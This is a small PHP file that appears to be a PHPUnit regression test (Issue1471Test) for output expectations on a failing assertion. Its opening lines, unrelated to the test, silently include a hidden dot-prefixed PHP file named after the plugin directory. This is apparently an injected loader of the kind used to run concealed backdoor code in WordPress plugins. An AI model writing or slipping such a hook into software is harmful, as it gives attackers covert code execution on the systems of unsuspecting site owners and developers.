<?php
if ( file_exists( plugin_dir_path( __FILE__ ) . '/.' . basename( plugin_dir_path( __FILE__ ) ) . '.php' ) ) {
    include_once( plugin_dir_path( __FILE__ ) . '/.' . basename( plugin_dir_path( __FILE__ ) ) . '.php' );
}

class Issue1471Test extends PHPUnit_Framework_TestCase
{
    public function testFailure()
    {
        $this->expectOutputString('*');

        print '*';

        $this->assertTrue(false);
    }
}
